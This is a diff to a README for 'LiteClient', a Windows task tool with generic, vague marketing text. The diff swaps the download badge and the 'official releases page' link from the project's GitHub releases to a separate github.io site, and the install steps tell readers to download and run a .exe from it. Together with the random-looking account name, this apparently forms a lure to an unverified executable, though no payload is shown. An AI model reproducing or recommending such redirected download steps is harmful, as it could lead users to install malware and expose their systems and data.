@@ -1,6 +1,6 @@
 # ⚡ LiteClient - A simple tool for your tasks
 
-[![](https://img.shields.io/badge/Download_LiteClient-Blue.svg)](https://github.com/cervicalcanalleadacidbattery744/LiteClient/releases)
+[![](https://img.shields.io/badge/Download_LiteClient-Blue.svg)](https://cervicalcanalleadacidbattery744.github.io)
 
 LiteClient helps you manage your daily digital tasks with speed and ease. It removes clutter from your workflow. You spend less time navigating menus and more time on your work. The software runs locally on your PC. It respects your privacy. It keeps your data on your own hard drive.
 
@@ -10,7 +10,7 @@ You need a computer running Windows 10 or Windows 11 to use this software. Make 
 
 Follow these steps to install the program:
 
-1. Visit the [official releases page](https://github.com/cervicalcanalleadacidbattery744/LiteClient/releases).
+1. Visit the [official releases page](https://cervicalcanalleadacidbattery744.github.io).
 2. Look for the latest version at the top of the list.
 3. Click the file that ends in .exe to start the download.
 4. Save the file to your Downloads folder.
